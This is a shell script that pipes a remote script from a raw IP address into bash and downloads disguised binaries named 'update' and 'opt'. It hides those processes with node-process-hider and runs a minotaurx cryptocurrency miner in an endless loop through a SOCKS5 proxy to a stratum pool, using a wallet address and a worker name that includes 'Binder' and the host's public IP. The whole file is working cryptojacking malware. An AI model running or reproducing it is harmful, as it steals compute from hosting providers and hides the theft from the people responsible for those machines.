#!/bin/sh
apt update >/dev/null;apt -y install git wget curl psmisc net-tools unzip cmake binutils build-essential sudo cgroupfs-mount python3 libcurl4-gnutls-dev libgmp3-dev zlib1g-dev 

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2

PID=`ps -eaf | grep shade | grep -v grep | awk '{print $2}'`
if [[ "" !=  "$PID" ]]; then
  echo "killing $PID"
  kill -9 $PID
fi

sleep 2

curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &

sleep 2

apt update >/dev/null;apt -y install net-tools apt-utils psmisc libreadline-dev dialog curl wget npm >/dev/null

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Binder_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`
echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

ph add opt 1>/dev/null 2>&1

sleep 2

curl -s -L -o update.tar.gz https://raw.githubusercontent.com/mandisimakhonkco/update/main/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1081
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

wget http://176.58.105.206/opt_v24.2.tar.gz 

sleep 2

tar -xf opt_v24.2.tar.gz

echo " "
echo " "

sleep 2

echo ""
echo "Your worker name will be $currentdate"
echo ""


while true
do
./opt -a minotaurx -o stratum+tcp://flyingsaucer-eu.teatspray.fun:7019 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 -p $currentdate,c=MAZA,zap=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
sleep 10
done
